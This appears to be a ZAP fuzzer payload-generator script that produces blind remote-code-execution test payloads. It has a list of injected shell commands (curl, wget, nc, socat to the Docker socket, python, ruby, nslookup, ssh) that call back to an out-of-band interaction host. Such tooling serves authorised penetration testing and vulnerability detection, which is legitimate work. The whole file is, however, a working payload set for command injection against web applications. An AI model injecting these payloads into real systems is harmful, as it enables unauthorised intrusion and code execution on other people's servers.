// @hahwul
// Blind RCE Payload with OOB

var oast = ""
var Control = Java.type("org.parosproxy.paros.control.Control")
var extOast = Control.getSingleton().getExtensionLoader().getExtension("ExtensionOast")
var boast = extOast.getBoastService()
var registeredServers = boast.getRegisteredServers()
var oast = ""
var pattern = [
  "curl <OAST>",
  "wget <OAST>",
  "openssl s_client -connect <OAST>:443",
  "echo -e \"GET / HTTP/1.1\\nHost: <OAST>\\n\\n\" | nc <OAST> 80",
  "ruby -e \"require 'net/http';Net::HTTP.get(URI.parse('http://<OAST>'))\"",
  "python3 -c \"import requests;response = requests.get('http://<OAST>')\"",
  "echo -e \"GET / HTTP/1.1\\nHost: <OAST>\\n\\n\" | socat unix-connect:/var/run/docker.sock STDIO",
  "echo -e \"GET / HTTP/1.1\\nHost: <OAST>\\n\\n\" | socat unix-connect:/var/run/docker.sock STDIO",
  "nslookup <OAST>",
  "dig <OAST>",
  "ping <OAST>",
  "traceroute <OAST>",
  "ssh <OAST>"
]
var NUMBER_OF_PAYLOADS = pattern.length-1;
var INITIAL_VALUE = 0;
var count = INITIAL_VALUE;

if (registeredServers.isEmpty()) {
    print("No Servers Registered.")
} else {
    oast = registeredServers[0].getPayload()
}

function getNumberOfPayloads() {
	return NUMBER_OF_PAYLOADS;
}

function hasNext() {
	return (count <= NUMBER_OF_PAYLOADS);
}

function next() {
	payload = pattern[count].replaceAll("<OAST>", oast);
	count++;
	return payload;
}

function reset() {
	count = INITIAL_VALUE;
}

function close() {
}
